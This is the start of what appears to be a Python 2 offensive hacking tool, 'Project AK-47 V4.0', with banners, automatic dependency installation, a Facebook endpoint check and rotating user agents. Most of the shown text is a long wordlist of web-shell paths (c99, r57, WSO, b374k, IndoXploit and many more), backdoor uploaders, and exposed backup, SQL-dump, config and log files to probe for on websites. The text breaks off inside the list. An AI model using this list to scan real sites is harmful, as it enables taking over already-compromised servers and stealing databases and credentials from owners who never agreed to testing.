# -*- coding: UTF-8 -*-
import os , sys , base64 , random , hashlib , time , json
import re
from multiprocessing.pool import ThreadPool
from multiprocessing import *

W  = '\033[1;37m' 
N  = '\033[0m'
R="\033[1;37m\033[31m" 
B  = '\033[1;37m\033[34m' 
G  = '\033[1;32m' 
Y = '\033[1;33;40m'

SR = W+"["+R+"*"+W+"]"
SG = W+"["+G+"*"+W+"]"
SRO = W+"("+R+">"+W+")"
SGO = W+"("+G+">"+W+")"
xin = "\n"
SBG = '\x1b[1;37m(\x1b[1;32m\xe2\x97\x8f\x1b[1;37m)'
SBR = '\x1b[1;37m(\x1b[1;37m\x1b[31m\xe2\x97\x8f\x1b[1;37m)'

bannerm = ['\n   {}      ,{}\n         \\ , , /\n         (\xd2\x82{}\xc2\xb0{}_{}\xc2\xb0{}){}      Project AK-47\n   {}         <,,{}\xef\xb8\xbb\xe2\x95\xa6\xe2\x95\xa4\xe2\x94\x80 {}\xc2\xbb\xc2\xbb\xc2\xbb\xc2\xbb\xc2\xbb\xc2\xbb\xc2\xbb\xc2\xbb\xc2\xbb\xc2\xbb\xc2\xbb\xc2\xbb\xc2\xbb\xc2\xbb\xc2\xbb{}\xc2\xbb \xd2\x89 {}\n         _/\xef\xb9\x8b\\___\n'.format(G,W,G,W,G,W,W,W,R,Y,R,W)]

banner = ['\n   {}      ,{}     Dedicated To Gulani Saitej (DarkSec)\n         \\ , , /\n         (\xd2\x82{}\xc2\xb0{}_{}\xc2\xb0{}){}     Project-AK-47\n   {}      <,,{}\xef\xb8\xbb\xe2\x95\xa6\xe2\x95\xa4\xe2\x94\x80 {}\xc2\xbb\xc2\xbb\xc2\xbb\xc2\xbb\xc2\xbb\xc2\xbb\xc2\xbb\xc2\xbb\xc2\xbb\xc2\xbb\xc2\xbb\xc2\xbb\xc2\xbb\xc2\xbb\xc2\xbb{}\xc2\xbb \xd2\x89 {}  V4.0{}\n         _/\xef\xb9\x8b\\___  Dev : Nasir Ali\n'.format(G,W,G,W,G,W,W,W,R,Y,R,G,W)]


procx = ThreadPool(int(cpu_count())*5)
os.system("clear")

def funx(word):
 lix = ['/',"-","|"]
 for i in range(5):
   for x in range(len(lix)):
    sys.stdout.write('\r{}.. {}'.format(str(word),lix[x]))
    time.sleep(0.3)
    sys.stdout.flush()

if int(sys.version[0]) != 2:
  sys.stdout.write("It's Python2 Script \n use python2 ")
  sys.exit()

try:
 from requests import *
 from bs4 import *
 import requests
 print xin+SGO+G+" Requirements Available"
except:
 print xin+SRO+R+"Installing Requirements......"
 os.system("pip2 install requests")
 os.system("pip2 install bs4")
 from requests import *
 from bs4 import *
 import requests
 os.system("clear")


s = Session()

headers = {"Accept-Language": "en-US,en;q=0.5"}
url = "https://free.facebook.com{}"

funx(SG+Y+" Checking For Free-Facebook Support")

try:
 if get("https://free.facebook.com",allow_redirects=False).status_code != 200:
   print xin+SR+R+" Free Facebook Not Supported:("
   url = "https://mbasic.facebook.com{}"
 else:
   print xin+SG+G+" Free Facebook Mode Available :)"
except:
 print xin+SR+R+" No Internet Connection:("
 sys.exit()




#========================================


headers_list = [
        "Mozilla/5.0 (Windows NT 5.1; rv:41.0) Gecko/20100101"\
        " Firefox/41.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2)"\
        " AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2"\
        " Safari/601.3.9",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0)"\
        " Gecko/20100101 Firefox/15.0.1",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"\
        " (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36"\
        " Edge/12.246"
        ]

shellp = """/wso.php
/wso-2.5.php
/deray.txt
/wos.php?login=wos
/1945.php?login=1945
/wos.php
/1945.php
/45.php
/cc.php
/ls.php
/system.php
/cmd.php
/rootx.php
/adminer.php
/jkt48_1.php
/indonesia.php
/php.php
/b374k.php
/1n73ction.php
/shell.php
/sh3ll.php
/root.php
/bh.php
/sbh.php
/idca.php
/indoxploit.php
/indoxploit_shell.php
/idca_shell.php
/bejak.php
/injection.php
/gaza.php
/andela.php
/jkt48.php
/backdoor.php
/backd00r.php
/1337.php
/komet.php
/bekdur.php
/bd.php
/arab.php
/xxx.php
/c99.php
/r57.php
/webadmin.php
/data.php
/konten.php
/kamu.php
/iya.php
/koe.php
/gca.php
/sj.php
/shell.asp
/R57.php
/C99.php
/inject.php
/kdoor.php
/index.php
/o.php
/mosok.php
/v.php
/i.php
/a.php
/s.php
/ap.php
/you.php
/1.php
/2.php
/3.php
/4.php
/5.php
/6.php
/7.php
/8.php
/9.php
/10.php
b.php
r.php
s.php
u.php
y.php
k.php
l.php
i.php
o.php
m.php
j.php
c.php
z.php
q.php
e.php
w.php
t.php
r.php
f.php
d.php
ok.php
1.php
2.php
3.php
4.php
5.php
7.php
6.php
8.php
9.php
0.php
00.php
herp.php
nptice.php
tuyul.php
nikung.php
tertykung.php
codrs.php
jingan.php
chan.php
kntl.php
losX.php
mom.php
sad.php
uploads/ok.php
upload/ok.php
upload/up.php
upload/shell.php
upload/idx.php
upload/ind.php
upload/v.php
upload/sym.php
upload/gallers.php
upload/bekdur.php
upload/file/up.php
upload/file/wso.php
upload/file/test.php
upload/file/WSO.php
upload/file/123.php
upload/file/uploader.php
upload/file/upload.php
upload/file/zero.php
upload/file/ups.php
upload/file/tmp.php
upload/file/jump.php
upload/file/x.php
upload/file/X.php
upload/file/idx.php
upload/file/b3ca7k.php
upload/file/indo.php
upload/file/asu.php
upload/file/dhanush.php
upload/file/aaa.php
upload/file/az.php
upload/file/xxx.php
upload/file/curl.php
upload/file/root.php
upload/file/asu.php
upload/file/id.php
upload/file/minishell.php
upload/file/kill.php
upload/file/0.php
upload/file/alone.php
upload/file/hex.php
upload/file/500.php
upload/file/error.php
upload/file/406.php
upload/file/fuck.php
upload/file/zzz.php
images/WSO.php
images/dz.php
images/DZ.php
images/cpanel.php
images/cpn.php
images/sos.php
images/term.php
images/Sec-War.php
images/sql.php
images/ssl.php
images/mysql.php
images/WolF.php
images/madspot.php
images/Cgishell.pl
images/killer.php
images/changeall.php
images/2.php
images/Sh3ll.php
images/dz0.php
images/dam.php
images/user.php
images/dom.php
images/whmcs.php
images/vb.zip
images/sa.php
images/sysadmins/
images/admin1/
images/sniper.php
images/images/Sym.php
images//r57.php
images/gzaa_spysl
images/sql-new.php
images/shell.php
images/sa.php
images/admin.php
images/sa2.php
images/2.php
images/user.txt
images/site.txt
images/error_log
images/error
images/site.sql
images/vb.sql
images/forum.sql
images/r00t-s3c.php
images/c.php
images/backup.sql
images/back.sql
images/data.sql
images/tmp/vaga.php
images/tmp/killer.php
images/whmcs.php
images/abuhlail.php
images/tmp/killer.php
images/tmp/domaine.pl
images/tmp/domaine.php
images/useradmin/
images/tmp/d0maine.php
images/d0maine.php
images/tmp/sql.php
images/X.php
images/123.php
images/m.php
images/b.php
images/up.php
images/tmp/dz1.php
images/dz1.php
images/Symlink.php
images/Symlink.pl
images/joomla.zip
images/wp.php
images/buck.sql
includes/WSO.php
includes/dz.php
includes/DZ.php
includes/cpanel.php
includes/cpn.php
includes/sos.php
includes/term.php
includes/Sec-War.php
includes/sql.php
includes/ssl.php
includes/mysql.php
includes/WolF.php
includes/madspot.php
includes/Cgishell.pl
includes/killer.php
includes/changeall.php
includes/2.php
includes/Sh3ll.php
includes/dz0.php
includes/dam.php
includes/user.php
includes/dom.php
includes/whmcs.php
includes/vb.zip
includes/r00t.php
includes/c99.php
includes/gaza.php
includes/1.php
includes/d0mains.php
includes/madspotshell.php
includes/info.php
includes/egyshell.php
includes/Sym.php
includes/c22.php
includes/c100.php
includes/configuration.php
includes/g.php
includes/xx.pl
includes/ls.php
includes/Cpanel.php
includes/k.php
includes/zone-h.php
includes/tmp/user.php
includes/tmp/Sym.php
includes/cp.php
includes/tmp/madspotshell.php
includes/tmp/root.php
includes/tmp/whmcs.php
includes/tmp/index.php
includes/tmp/2.php
includes/tmp/dz.php
includes/tmp/cpn.php
includes/tmp/changeall.php
includes/tmp/Cgishell.pl
includes/tmp/sql.php
includes/0day.php
includes/tmp/admin.php
includes/L3b.php
includes/d.php
includes/tmp/d.php
includes/tmp/L3b.php
includes/sado.php
includes/admin1.php
includes/upload.php
includes/up.php
includes/vb.zip
includes/vb.rar
includes/admin2.asp
includes/uploads.php
includes/sa.php
includes/sysadmins/
includes/admin1/
includes/sniper.php
includes/images/Sym.php
includes//r57.php
includes/gzaa_spysl
includes/sql-new.php
includes//shell.php
includes//sa.php
includes//admin.php
includes//sa2.php
includes//2.php
includes//gaza.php
includes//up.php
includes//upload.php
includes//uploads.php
includes/shell.php
includes//amad.php
includes//t00.php
includes//dz.php
includes//site.rar
includes//Black.php
includes//site.tar.gz
includes//home.zip
includes//home.rar
includes//home.tar
includes//home.tar.gz
includes//forum.zip
includes//forum.rar
includes//forum.tar
includes//forum.tar.gz
includes//test.txt
includes//ftp.txt
includes//user.txt
includes//site.txt
includes//error_log
includes//error
includes//cpanel
includes//awstats
includes//site.sql
includes//vb.sql
includes//forum.sql
includes/r00t-s3c.php
includes/c.php
includes//backup.sql
includes//back.sql
includes//data.sql
includes/wp.rar/
includes/asp.aspx
includes/tmp/vaga.php
includes/tmp/killer.php
includes/whmcs.php
includes/abuhlail.php
includes/tmp/killer.php
includes/tmp/domaine.pl
includes/tmp/domaine.php
includes/useradmin/
includes/tmp/d0maine.php
includes/d0maine.php
includes/tmp/sql.php
includes/X.php
includes/123.php
includes/m.php
includes/b.php
includes/up.php
includes/tmp/dz1.php
includes/dz1.php
includes/forum.zip
includes/Symlink.php
includes/Symlink.pl
includes/joomla.zip
includes/joomla.rar
includes/wp.php
includes/buck.sql
includes/sysadmin.php
includes/images/c99.php
includes/xd.php
includes/c100.php
includes/spy.aspx
includes/xd.php
includes/tmp/xd.php
includes/sym/root/home/
includes/billing/killer.php
includes/tmp/upload.php
includes/tmp/admin.php
includes/Server.php
includes/tmp/uploads.php
includes/tmp/up.php
includes/Server/
includes/wp-admin/c99.php
includes/tmp/priv8.php
includes/priv8.php
includes/cgi.pl/
includes/tmp/cgi.pl
includes/downloads/dom.php
includes/webadmin.html
includes/admins.php
includes/bluff.php
includes/king.jeen
includes/admins/
includes/admins.asp
includes/admins.php
includes/wp.zip
includes/
upload.php
admin/upload.php
shell.php
up.php
uploader.php
a.php
123.php
test.php
minishell.php
0.php
wso.php
error_log
tools.php
r00t.php
admin/error_log
access_log
phpinfo.php
info.php
xxx.php
indo.php
idx.php
sym.py
dir/
lib/
tmp/
includes/
log/error_log
log/error.log
log/www-error.log
include/
Scripts/
test/
sym/root/home/
chonx_sym/
chonx_root/
web/
upload/
images/
img/
inc/
js/
php/
symlink/
sym/
idx_config/
config/
Log/
cox_config/
sym_config/
noname_config/
idx_symconf/
symconf/
root/
file/
files/
config.txt
asu.php
index.php
index.php/?login
db.php
README.txt
include/config.php
config.php
logs
indoxploit.php
index1.php
index.html
sh3ll.php
up.html
script.php
fuck.php
dir.php
406.php
403.php
500.php
accounts.php
bekdur.php
notfound.php
not_acceptable.php
1337.php
1n73ct10n.php
b374k.php
admin_home.php
home_admin.php
shell.php
zeeb.php
dz.php
xd.php
images/up.php
images/upload.php
files/up.php
file/upload.php
files/shell.php
files/uploader.php
files/indexx.php
file/up.php
file/uplod.php
file/wso.php
file/idx.php
file/up1.php
13.php
killer.php
Sh3ll.php
new.php
Sym.php
dom.php
zero.php
priv8.php
jembut.php
v4ga.php
backup.zip
s3c.php
madspotshell.php
sa.php
x.php
noname.php
kntol.php
WSO.php
IndoXploit.php
bajingan.php
c99.php
X.php
Good.php
pas.phtml
pas.php
abc.php
indexx.php
browse.php
up1.php
haha.php
z.php
gaza.php
sc.php
1234.php
fvck.php
error.php
0x.php
up.php5
shell.php5
inc/config.php
ix.php
-.php
id.php
r0x.php
bn.php
dm.php
gator.php
mail.php
mailer.php
perlcgi.pl
php.ini
modul.php
wso1.php
wp.php
configuration.php
c.php
tai.php
root.php
www.php
x13.php
ntaps.php
tools.php
zip.php
@.php
ea.php
aaaa.php
cinfo.php
by.php
celeng.php
jmbt.php
newfile.php
maho.php
mia.php
pro.php
qwe.php
shell_finder.php
11.php
cfinder.php
title.php
edit.php
s.php
wp.zip
xmlrpc.php
pasired.php
pass.php
adm.php
adminer.php
Cpanel.php
cpanel.php
noob.php
..php
b2.php
lol.php
Lol.php
dhanush.php
asw.php
mini.php5
ler.php
def.php
ex.php
noname.php
unknown.php
anon.php
sel.php
extremecrw.php
indx.php
14.php
6.php
angel.php
bv7binary.php
c100.php
r57.php
webroot.php
h4cker.php
gazashell.php
locus7shell.php
syrianshell.php
injection.php
cyberwarrior.php
ernebypass.php
g6shell.php
pouyaserver.php
saudishell.php
simattacker.php
sosyeteshell.php
tryagshell.php
uploadshell.php
wsoshell.php
zehir4shell.php
lostdcshell.php
commandshell.php
mailershell.php
cwshell.php
iranshell.php
indishell.php
g6sshell.php
sqlshell.php
simshell.php
tryagshell.php
zehirshell.php
k2ll33d.php
b1n4ry.php
12.php
default.php
blank.php
/index.php?option=com_fabrik&amp;c=import&amp;view=import&amp;filetype=csv&amp;tableid=1echercher
/index.php?option=com_fabrik&c=import&view=import&filetype=csv&table=1
/fckeditor/editor/filemanager/browser/default/browser.html?Connector=connectors/php/connector.php
/wp-content/plugins/disqus-comment-system/disqus.php
/d0mains.php
/wp-content/plugins/akismet/akismet.php
/madspotshell.php
/info.php
/egyshell.php
/Sym.php
/c22.php
/c100.php
/wp-content/plugins/akismet/admin.php
/configuration.php
/g.php
/wp-content/plugins/google-sitemap-generator/sitemap-core.php
/wp-content/plugins/akismet/widget.php
/xx.pl
/ls.php
/Cpanel.php
/k.php
/zone-h.php
/tmp/user.php
/tmp/Sym.php
/cp.php
/tmp/madspotshell.php
/tmp/root.php
/tmp/whmcs.php
/tmp/index.php
/tmp/2.php
/tmp/dz.php
/tmp/cpn.php
/tmp/changeall.php
/tmp/Cgishell.pl
/tmp/sql.php
/0day.php
/tmp/admin.php
/cliente/downloads/h4xor.php
/whmcs/downloads/dz.php
/L3b.php
/d.php
/tmp/d.php
/tmp/L3b.php
/wp-content/plugins/akismet/admin.php
/templates/rhuk_milkyway/index.php
/templates/beez/index.php
/sado.php
/admin1.php
/upload.php
/up.php
/vb.zip
/vb.rar
/admin2.asp
/uploads.php
/sa.php
/sysadmins/
/admin1/
/sniper.php
/administration/Sym.php
images/Sym.php
/r57.php
/wp-content/plugins/disqus-comment-system/disqus.php
gzaa_spysl
sql-new.php
/shell.php
/sa.php
/admin.php
/sa2.php
/2.php
/gaza.php
/up.php
/upload.php
/uploads.php
/templates/beez/index.php
shell.php
/amad.php
/t00.php
/dz.php
/site.rar
/Black.php
/site.tar.gz
/home.zip
/home.rar
/home.tar
/home.tar.gz
/forum.zip
/forum.rar
/forum.tar
/forum.tar.gz
/test.txt
/ftp.txt
/user.txt
/site.txt
/error_log
/error
/cpanel
/awstats
/site.sql
/vb.sql
/forum.sql
r00t-s3c.php
c.php
/backup.sql
/back.sql
/data.sql
wp.rar/
wp-content/plugins/disqus-comment-system/disqus.php
asp.aspx
/templates/beez/index.php
/tmp/vaga.php
/tmp/killer.php
/whmcs.php
abuhlail.php
/tmp/killer.php
/tmp/domaine.pl
/tmp/domaine.php
/useradmin/
/tmp/d0maine.php
/d0maine.php
/tmp/sql.php
/X.php
/123.php
/m.php
/b.php
/up.php
/tmp/dz1.php
/dz1.php
/forum.zip
/Symlink.php
/Symlink.pl
/forum.rar
/joomla.zip
/joomla.rar
/wp.php
/buck.sql
/sysadmin.php
/images/c99.php
/xd.php
/c100.php
/spy.aspx
/xd.php
/tmp/xd.php
/sym/root/home/
/billing/killer.php
/tmp/upload.php
/tmp/admin.php
/Server.php
/tmp/uploads.php
/tmp/up.php
/Server/
/wp-admin/c99.php
/tmp/priv8.php
priv8.php
cgi.pl/
/tmp/cgi.pl
/downloads/dom.php
/templates/ja-helio-farsi/index.php
/webadmin.html
/admins.php
/wp-content/plugins/count-per-day/js/yc/d00.php
/bluff.php
/king.jeen
/admins/
/admins.asp
/admins.php
/templates/beez/dz.php
/templates/beez/DZ.php
/templates/beez/cpn.php
/templates/beez/sos.php
/templates/beez/term.php
/templates/beez/Sec-War.php
/templates/beez/sql.php
/templates/beez/ssl.php
/templates/beez/mysql.php
/templates/beez/WolF.php
/templates/beez/configuration.php
/templates/beez/g.php
/templates/beez/xx.pl
/templates/beez/ls.php
/templates/beez/Cpanel.php
/templates/beez/k.php
/templates/beez/zone-h.php
/templates/beez/tmp/user.php
/templates/beez/tmp/Sym.php
/templates/beez/cp.php
/templates/beez/tmp/madspotshell.php
/templates/beez/tmp/root.php
/templates/beez/tmp/whmcs.php
/templates/beez/tmp/index.php
/templates/beez/tmp/2.php
/templates/beez/tmp/dz.php
/templates/beez/tmp/cpn.php
/templates/beez/tmp/changeall.php
/templates/beez/tmp/Cgishell.pl
/templates/beez/tmp/sql.php
/templates/beez/0day.php
/templates/beez/tmp/admin.php
/templates/beez/L3b.php
/templates/beez/d.php
/templates/beez/tmp/d.php
/templates/beez/tmp/L3b.php
/templates/beez/sado.php
/templates/beez/admin1.php
/templates/beez/upload.php
/templates/beez/up.php
/templates/beez/vb.zip
/templates/beez/vb.rar
/templates/beez/admin2.asp
/templates/beez/uploads.php
/templates/beez/sa.php
/templates/beez/sysadmins/
/templates/beez/admin1/
/templates/beez/sniper.php
/templates/beez/images/Sym.php
/templates/beez//r57.php
/templates/beez/gzaa_spysl
/templates/beez/sql-new.php
/templates/beez//shell.php
/templates/beez//sa.php
/templates/beez//admin.php
/templates/beez//sa2.php
/templates/beez//2.php
/templates/beez//gaza.php
/templates/beez//up.php
/templates/beez//upload.php
/templates/beez//uploads.php
/templates/beez/shell.php
/templates/beez//amad.php
/templates/beez//t00.php
/templates/beez//dz.php
/templates/beez//site.rar
/templates/beez//Black.php
/templates/beez//site.tar.gz
/templates/beez//home.zip
/templates/beez//home.rar
/templates/beez//home.tar
/templates/beez//home.tar.gz
/templates/beez//forum.zip
/templates/beez//forum.rar
/templates/beez//forum.tar
/templates/beez//forum.tar.gz
/templates/beez//test.txt
/templates/beez//ftp.txt
/templates/beez//user.txt
/templates/beez//site.txt
/templates/beez//error_log
/templates/beez//error
/templates/beez//cpanel
/templates/beez//awstats
/templates/beez//site.sql
/templates/beez//vb.sql
/templates/beez//forum.sql
/templates/beez/r00t-s3c.php
/templates/beez/c.php
/templates/beez//backup.sql
/templates/beez//back.sql
/templates/beez//data.sql
/templates/beez/wp.rar/
/templates/beez/asp.aspx
/templates/beez/tmp/vaga.php
/templates/beez/tmp/killer.php
/templates/beez/whmcs.php
/templates/beez/abuhlail.php
/templates/beez/tmp/killer.php
/templates/beez/tmp/domaine.pl
/templates/beez/tmp/domaine.php
/templates/beez/useradmin/
/templates/beez/tmp/d0maine.php
/templates/beez/d0maine.php
/templates/beez/tmp/sql.php
/templates/beez/X.php
/templates/beez/123.php
/templates/beez/m.php
/templates/beez/b.php
/templates/beez/up.php
/templates/beez/tmp/dz1.php
/templates/beez/dz1.php
/templates/beez/forum.zip
/templates/beez/Symlink.php
/templates/beez/Symlink.pl
/templates/beez/forum.rar
/templates/beez/joomla.zip
/templates/beez/joomla.rar
/templates/beez/wp.php
/templates/beez/buck.sql
/templates/beez/sysadmin.php
/templates/beez/images/c99.php
/templates/beez/xd.php
/templates/beez/c100.php
/templates/beez/spy.aspx
/templates/beez/xd.php
/templates/beez/tmp/xd.php
/templates/beez/sym/root/home/
/templates/beez/billing/killer.php
/templates/beez/tmp/upload.php
/templates/beez/tmp/admin.php
/templates/beez/Server.php
/templates/beez/tmp/uploads.php
/templates/beez/tmp/up.php
/templates/beez/Server/
/templates/beez/wp-admin/c99.php
/templates/beez/tmp/priv8.php
/templates/beez/priv8.php
/templates/beez/cgi.pl/
/templates/beez/tmp/cgi.pl
/templates/beez/downloads/dom.php
/templates/beez/webadmin.html
/templates/beez/admins.php
/templates/beez/bluff.php
/templates/beez/king.jeen
/templates/beez/admins/
/templates/beez/admins.asp
/templates/beez/admins.php
/templates/beez/wp.zip
/templates/beez/index.php
/images/WSO.php
/images/dz.php
/images/DZ.php
/images/cpanel.php
/images/cpn.php
/images/sos.php
/images/term.php
/images/Sec-War.php
/images/sql.php
/images/ssl.php
/images/mysql.php
/images/WolF.php
/images/madspot.php
/images/Cgishell.pl
/images/killer.php
/images/changeall.php
/images/2.php
/images/Sh3ll.php
/images/dz0.php
/images/dam.php
/images/user.php
/images/dom.php
/images/whmcs.php
/images/vb.zip
/images/sa.php
/images/sysadmins/
/images/admin1/
/images/sniper.php
/images/images/Sym.php
/images//r57.php
/images/gzaa_spysl
/images/sql-new.php
/images//shell.php
/images//sa.php
/images//admin.php
/images//sa2.php
/images//2.php
/images//user.txt
/images//site.txt
/images//error_log
/images//error
/images//cpanel
/images//awstats
/images//site.sql
/images//vb.sql
/images//forum.sql
/images/r00t-s3c.php
/images/c.php
/images//backup.sql
/images//back.sql
/images//data.sql
/images/wp.rar/
/images/asp.aspx
/images/tmp/vaga.php
/images/tmp/killer.php
/images/whmcs.php
/images/abuhlail.php
/images/tmp/killer.php
/images/tmp/domaine.pl
/images/tmp/domaine.php
/images/useradmin/
/images/tmp/d0maine.php
/images/d0maine.php
/images/tmp/sql.php
/images/X.php
/images/123.php
/images/m.php
/images/b.php
/images/up.php
/images/tmp/dz1.php
/images/dz1.php
/images/forum.zip
/images/Symlink.php
/images/Symlink.pl
/images/forum.rar
/images/joomla.zip
/images/joomla.rar
/images/wp.php
/images/buck.sql
/includes/WSO.php
/includes/dz.php
/includes/DZ.php
/includes/cpanel.php
/includes/cpn.php
/includes/sos.php
/includes/term.php
/includes/Sec-War.php
/includes/sql.php
/includes/ssl.php
/includes/mysql.php
/includes/WolF.php
/includes/madspot.php
/includes/Cgishell.pl
/includes/killer.php
/includes/changeall.php
/includes/2.php
/includes/Sh3ll.php
/includes/dz0.php
/includes/dam.php
/includes/user.php
/includes/dom.php
/includes/whmcs.php
/includes/vb.zip
/includes/r00t.php
/includes/c99.php
/includes/gaza.php
/includes/1.php
/includes/d0mains.php
/includes/madspotshell.php
/includes/info.php
/includes/egyshell.php
/includes/Sym.php
/includes/c22.php
/includes/c100.php
/includes/configuration.php
/includes/g.php
/includes/xx.pl
/includes/ls.php
/includes/Cpanel.php
/includes/k.php
/includes/zone-h.php
/includes/tmp/user.php
/includes/tmp/Sym.php
/includes/cp.php
/includes/tmp/madspotshell.php
/includes/tmp/root.php
/includes/tmp/whmcs.php
/includes/tmp/index.php
/includes/tmp/2.php
/includes/tmp/dz.php
/includes/tmp/cpn.php
/includes/tmp/changeall.php
/includes/tmp/Cgishell.pl
/includes/tmp/sql.php
/includes/0day.php
/includes/tmp/admin.php
/includes/L3b.php
/includes/d.php
/includes/tmp/d.php
/includes/tmp/L3b.php
/includes/sado.php
/includes/admin1.php
/includes/upload.php
/includes/up.php
/includes/vb.zip
/includes/vb.rar
/includes/admin2.asp
/includes/uploads.php
/includes/sa.php
/includes/sysadmins/
/includes/admin1/
/includes/sniper.php
/includes/images/Sym.php
/includes//r57.php
/includes/gzaa_spysl
/includes/sql-new.php
/includes//shell.php
/includes//sa.php
/includes//admin.php
/includes//sa2.php
/includes//2.php
/includes//gaza.php
/includes//up.php
/includes//upload.php
/includes//uploads.php
/includes/shell.php
/includes//amad.php
/includes//t00.php
/includes//dz.php
/includes//site.rar
/includes//Black.php
/includes//site.tar.gz
/includes//home.zip
/includes//home.rar
/includes//home.tar
/includes//home.tar.gz
/includes//forum.zip
/includes//forum.rar
/includes//forum.tar
/includes//forum.tar.gz
/includes//test.txt
/includes//ftp.txt
/includes//user.txt
/includes//site.txt
/includes//error_log
/includes//error
/includes//cpanel
/includes//awstats
/includes//site.sql
/includes//vb.sql
/includes//forum.sql
/includes/r00t-s3c.php
/includes/c.php
/includes//backup.sql
/includes//back.sql
/includes//data.sql
/includes/wp.rar/
/includes/asp.aspx
/includes/tmp/vaga.php
/includes/tmp/killer.php
/includes/whmcs.php
/includes/abuhlail.php
/includes/tmp/killer.php
/includes/tmp/domaine.pl
/includes/tmp/domaine.php
/includes/useradmin/
/includes/tmp/d0maine.php
/includes/d0maine.php
/includes/tmp/sql.php
/includes/X.php
/includes/123.php
/includes/m.php
/includes/b.php
/includes/up.php
/includes/tmp/dz1.php
/includes/dz1.php
/includes/forum.zip
/includes/Symlink.php
/includes/Symlink.pl
/includes/forum.rar
/includes/joomla.zip
/includes/joomla.rar
/includes/wp.php
/includes/buck.sql
/includes/sysadmin.php
/includes/images/c99.php
/includes/xd.php
/includes/c100.php
/includes/spy.aspx
/includes/xd.php
/includes/tmp/xd.php
/includes/sym/root/home/
/includes/billing/killer.php
/includes/tmp/upload.php
/includes/tmp/admin.php
/includes/Server.php
/includes/tmp/uploads.php
/includes/tmp/up.php
/includes/Server/
/includes/wp-admin/c99.php
/includes/tmp/priv8.php
/includes/priv8.php
/includes/cgi.pl/
/includes/tmp/cgi.pl
/includes/downloads/dom.php
/includes/webadmin.html
/includes/admins.php
/includes/bluff.php
/includes/king.jeen
/includes/admins/
/includes/admins.asp
/includes/admins.php
/includes/wp.zip
/includes/
/templates/rhuk_milkyway/WSO.php
/templates/rhuk_milkyway/dz.php
/templates/rhuk_milkyway/DZ.php
/templates/rhuk_milkyway/cpanel.php
/templates/rhuk_milkyway/cpn.php
/templates/rhuk_milkyway/sos.php
/templates/rhuk_milkyway/term.php
/templates/rhuk_milkyway/Sec-War.php
/templates/rhuk_milkyway/sql.php
/templates/rhuk_milkyway/ssl.php
/templates/rhuk_milkyway/mysql.php
/templates/rhuk_milkyway/WolF.php
/templates/rhuk_milkyway/madspot.php
/templates/rhuk_milkyway/Cgishell.pl
/templates/rhuk_milkyway/killer.php
/templates/rhuk_milkyway/changeall.php
/templates/rhuk_milkyway/2.php
/templates/rhuk_milkyway/Sh3ll.php
/templates/rhuk_milkyway/dz0.php
/templates/rhuk_milkyway/dam.php
/templates/rhuk_milkyway/user.php
/templates/rhuk_milkyway/dom.php
/templates/rhuk_milkyway/whmcs.php
/templates/rhuk_milkyway/vb.zip
/templates/rhuk_milkyway/r00t.php
/templates/rhuk_milkyway/c99.php
/templates/rhuk_milkyway/gaza.php
/templates/rhuk_milkyway/1.php
/templates/rhuk_milkyway/d0mains.php
/templates/rhuk_milkyway/madspotshell.php
/templates/rhuk_milkyway/info.php
/templates/rhuk_milkyway/egyshell.php
/templates/rhuk_milkyway/Sym.php
/templates/rhuk_milkyway/c22.php
/templates/rhuk_milkyway/c100.php
/templates/rhuk_milkyway/configuration.php
/templates/rhuk_milkyway/g.php
/templates/rhuk_milkyway/xx.pl
/templates/rhuk_milkyway/ls.php
/templates/rhuk_milkyway/Cpanel.php
/templates/rhuk_milkyway/k.php
/templates/rhuk_milkyway/zone-h.php
/templates/rhuk_milkyway/tmp/user.php
/templates/rhuk_milkyway/tmp/Sym.php
/templates/rhuk_milkyway/cp.php
/templates/rhuk_milkyway/tmp/madspotshell.php
/templates/rhuk_milkyway/tmp/root.php
/templates/rhuk_milkyway/tmp/whmcs.php
/templates/rhuk_milkyway/tmp/index.php
/templates/rhuk_milkyway/tmp/2.php
/templates/rhuk_milkyway/tmp/dz.php
/templates/rhuk_milkyway/tmp/cpn.php
/templates/rhuk_milkyway/tmp/changeall.php
/templates/rhuk_milkyway/tmp/Cgishell.pl
/templates/rhuk_milkyway/tmp/sql.php
/templates/rhuk_milkyway/0day.php
/templates/rhuk_milkyway/tmp/admin.php
/templates/rhuk_milkyway/L3b.php
/templates/rhuk_milkyway/d.php
/templates/rhuk_milkyway/tmp/d.php
/templates/rhuk_milkyway/tmp/L3b.php
/templates/rhuk_milkyway/sado.php
/templates/rhuk_milkyway/admin1.php
/templates/rhuk_milkyway/upload.php
/templates/rhuk_milkyway/up.php
/templates/rhuk_milkyway/vb.zip
/templates/rhuk_milkyway/vb.rar
/templates/rhuk_milkyway/admin2.asp
/templates/rhuk_milkyway/uploads.php
/templates/rhuk_milkyway/sa.php
/templates/rhuk_milkyway/sysadmins/
/templates/rhuk_milkyway/admin1/
/templates/rhuk_milkyway/sniper.php
/templates/rhuk_milkyway/images/Sym.php
/templates/rhuk_milkyway//r57.php
/templates/rhuk_milkyway/gzaa_spysl
/templates/rhuk_milkyway/sql-new.php
/templates/rhuk_milkyway//shell.php
/templates/rhuk_milkyway//sa.php
/templates/rhuk_milkyway//admin.php
/templates/rhuk_milkyway//sa2.php
/templates/rhuk_milkyway//2.php
/templates/rhuk_milkyway//gaza.php
/templates/rhuk_milkyway//up.php
/templates/rhuk_milkyway//upload.php
/templates/rhuk_milkyway//uploads.php
/templates/rhuk_milkyway/shell.php
/templates/rhuk_milkyway//amad.php
/templates/rhuk_milkyway//t00.php
/templates/rhuk_milkyway//dz.php
/templates/rhuk_milkyway//site.rar
/templates/rhuk_milkyway//Black.php
/templates/rhuk_milkyway//site.tar.gz
/templates/rhuk_milkyway//home.zip
/templates/rhuk_milkyway//home.rar
/templates/rhuk_milkyway//home.tar
/templates/rhuk_milkyway//home.tar.gz
/templates/rhuk_milkyway//forum.zip
/templates/rhuk_milkyway//forum.rar
/templates/rhuk_milkyway//forum.tar
/templates/rhuk_milkyway//forum.tar.gz
/templates/rhuk_milkyway//test.txt
/templates/rhuk_milkyway//ftp.txt
/templates/rhuk_milkyway//user.txt
/templates/rhuk_milkyway//site.txt
/templates/rhuk_milkyway//error_log
/templates/rhuk_milkyway//error
/templates/rhuk_milkyway//cpanel
/templates/rhuk_milkyway//awstats
/templates/rhuk_milkyway//site.sql
/templates/rhuk_milkyway//vb.sql
